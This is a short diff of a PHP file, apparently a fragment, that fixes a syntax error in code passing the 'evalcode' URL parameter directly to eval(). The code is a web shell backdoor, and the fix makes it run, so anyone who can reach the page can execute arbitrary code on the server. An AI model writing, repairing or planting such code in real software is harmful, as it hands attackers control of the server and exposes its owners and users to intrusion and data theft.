@@ -1,5 +1,5 @@
 <?php
-if(isset($_GET['evalcode']){
+if(isset($_GET['evalcode'])){
 	$s_code = $_GET['evalcode'];
 	ob_start();
 	eval($s_code);
